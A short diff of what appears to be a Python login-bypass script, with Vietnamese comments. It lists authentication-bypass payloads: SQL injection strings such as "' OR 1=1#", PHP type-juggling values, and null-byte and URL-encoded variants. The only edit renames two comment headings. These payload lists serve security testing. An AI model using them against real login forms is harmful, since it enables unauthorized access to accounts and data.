@@ -12,12 +12,12 @@ PAYLOADS = [
     "' UNION SELECT 1,2,3--", "admin'/*", "' OR 1=1#", "admin' AND 1=1#",
     "' or 1=1 limit 1 -- -+", "'='", "admin' OR '1'='1'/*", "' OR '1'='1' ({",
     
-    # --- Advanced: PHP Type Juggling & Array Bypass (Broken Logic) ---
+    # --- PHP Type Juggling & Array Bypass (Broken Logic) ---
     # Trong PHP, nếu backend dùng strcmp() lỏng lẻo, truyền array vào sẽ làm hàm trả về 0 (True)
     # Tuy requests python không truyền array thẳng qua chuỗi này được, nhưng ta mô phỏng logic:
     "a[]", "1e3", "0e12345", "true", "NULL",
 
-    # --- Advanced: Unicode / Encoding Bypasses ---
+    # --- Unicode / Encoding Bypasses ---
     "%bf%27 OR 1=1--", # Multi-byte SQLi
     "admin%00",        # Null Byte Bypass
     "%27%20OR%201%3D1", # Full URL Encode
